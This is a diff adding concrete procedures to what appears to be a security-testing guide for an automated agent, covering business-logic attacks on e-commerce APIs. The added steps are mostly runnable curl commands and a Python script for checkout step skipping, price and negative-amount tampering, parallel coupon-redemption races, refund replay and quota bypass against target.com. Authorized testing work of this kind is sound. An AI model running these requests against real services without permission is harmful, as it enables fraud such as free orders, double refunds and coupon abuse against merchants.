@@ -132,13 +132,117 @@ Business logic flaws exploit intended functionality to violate domain invariants
 - Business logic + IDOR: operate on others' resources once a workflow leak reveals IDs
 - Business logic + CSRF: force a victim to complete a sensitive step sequence
 
+## Concrete Testing Procedures
+
+### Step 1: Map the Workflow with a Proxy
+Intercept all requests during a normal checkout/payment/signup flow using caido or browser_action.
+Save each step's request to output/workflow_map.txt:
+
+    # Record each API call in sequence:
+    # Step 1: POST /api/cart/add → captures addToCart request
+    # Step 2: POST /api/checkout/init → captures checkout init
+    # Step 3: POST /api/payment/confirm → captures payment confirm
+    curl -s -X GET https://target.com/api/cart -H "Cookie: session=<your_session>" -v 2>&1 | tee output/workflow_step1.txt
+
+### Step 2: Test State Machine — Skip Steps Directly
+
+    # Try calling final step (confirm) without completing earlier steps (init)
+    # Replace step tokens with valid session but NO prior initialization
+    curl -s -X POST https://target.com/api/checkout/confirm \
+      -H "Content-Type: application/json" \
+      -H "Cookie: session=<session>" \
+      -d '{"order_id":"12345","amount":0}' | tee output/state_skip_test.txt
+
+    # Check: does the server reject this, or does it process a $0 order?
+    # SUCCESS (vuln): 200 OK or order created without proper validation
+
+### Step 3: Test Price/Amount Manipulation
+
+    # Intercept cart request and replace server-sent price with 1 cent
+    curl -s -X POST https://target.com/api/cart/checkout \
+      -H "Content-Type: application/json" \
+      -H "Cookie: session=<session>" \
+      -d '{"items":[{"id":"prod_123","qty":1,"price":0.01}]}' | tee output/price_tamper.txt
+
+    # Also test negative amounts:
+    curl -s -X POST https://target.com/api/cart/checkout \
+      -H "Content-Type: application/json" \
+      -H "Cookie: session=<session>" \
+      -d '{"items":[{"id":"prod_123","qty":1,"price":-9999}]}' | tee output/negative_price.txt
+
+### Step 4: Test Race Condition (Double-Spend / Double-Redeem)
+
+    # Use parallel curl calls to race a one-time coupon or limited resource
+    # Bash parallel execution:
+    for i in $(seq 1 20); do
+      curl -s -X POST https://target.com/api/coupon/redeem \
+        -H "Content-Type: application/json" \
+        -H "Cookie: session=<session>" \
+        -d '{"code":"PROMO10"}' &
+    done
+    wait | tee output/race_condition_test.txt
+    # Count successful responses: grep -c '"success":true' output/race_condition_test.txt
+    # If >1 success → race condition confirmed
+
+    # Python concurrent version (more reliable):
+    python3 -c "
+import requests, concurrent.futures, json
+URL = 'https://target.com/api/coupon/redeem'
+HEADERS = {'Cookie': 'session=<session>', 'Content-Type': 'application/json'}
+DATA = json.dumps({'code': 'PROMO10'})
+def redeem(_): return requests.post(URL, headers=HEADERS, data=DATA, timeout=5)
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    results = list(ex.map(redeem, range(20)))
+successes = [r.text for r in results if r.status_code == 200]
+print(f'Successes: {len(successes)}')
+print(successes[:3])
+" | tee output/race_condition_python.txt
+
+### Step 5: Test Refund Abuse
+
+    # Step 1: Make a purchase, note order_id
+    # Step 2: Submit refund via UI → note refund_id
+    # Step 3: Replay same refund request (idempotency test)
+    REFUND_ID=$(cat output/refund_id.txt)
+    curl -s -X POST https://target.com/api/refund \
+      -H "Cookie: session=<session>" \
+      -d "{\"order_id\":\"$ORDER_ID\",\"amount\":50}" | tee output/refund_test1.txt
+    # Replay same request with same idempotency key:
+    curl -s -X POST https://target.com/api/refund \
+      -H "Cookie: session=<session>" \
+      -d "{\"order_id\":\"$ORDER_ID\",\"amount\":50}" | tee output/refund_test2.txt
+    # Check: does second refund succeed? If yes → double refund vulnerability
+
+### Step 6: Test Quota/Limit Bypass
+
+    # Test off-by-one at quota boundary (e.g., free tier = 10 API calls/day)
+    for i in $(seq 1 12); do
+      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+        -H "Cookie: session=<session>" \
+        https://target.com/api/limited_endpoint)
+      echo "Call $i: $STATUS"
+    done | tee output/quota_test.txt
+    # After quota hit (429), test if resetting session or using different header bypasses:
+    curl -s -X GET https://target.com/api/limited_endpoint \
+      -H "Cookie: session=<new_session_same_account>" | tee output/quota_bypass.txt
+
+### Step 7: Verify Persistence (MANDATORY before reporting)
+
+    # After exploit attempt, verify state change persisted in authoritative source
+    # Check account balance / order history / credit balance:
+    curl -s https://target.com/api/account/balance \
+      -H "Cookie: session=<session>" | tee output/balance_verify.txt
+    curl -s https://target.com/api/orders?limit=5 \
+      -H "Cookie: session=<session>" | tee output/orders_verify.txt
+    # ONLY report if you can show DURABLE state change (e.g., negative balance, extra refund shown in history)
+
 ## Testing Methodology
 
 1. **Enumerate state machine** - Per critical workflow (states, transitions, pre/post-conditions); note invariants
 2. **Build Actor × Action × Resource matrix** - Unauth, basic user, premium, staff/admin; identify actions per role
-3. **Test transitions** - Step skipping, repetition, reordering, late mutation
-4. **Introduce variance** - Time, concurrency, channel (mobile/web/API/GraphQL), content-types
-5. **Validate persistence boundaries** - All services, queues, and jobs re-enforce invariants
+3. **Test transitions** - Step skipping, repetition, reordering, late mutation (use curl commands from Step 2-3 above)
+4. **Introduce variance** - Time, concurrency, channel (mobile/web/API/GraphQL), content-types (use race tests from Step 4)
+5. **Validate persistence boundaries** - All services, queues, and jobs re-enforce invariants (use Step 7 verification)
 
 ## Validation
 
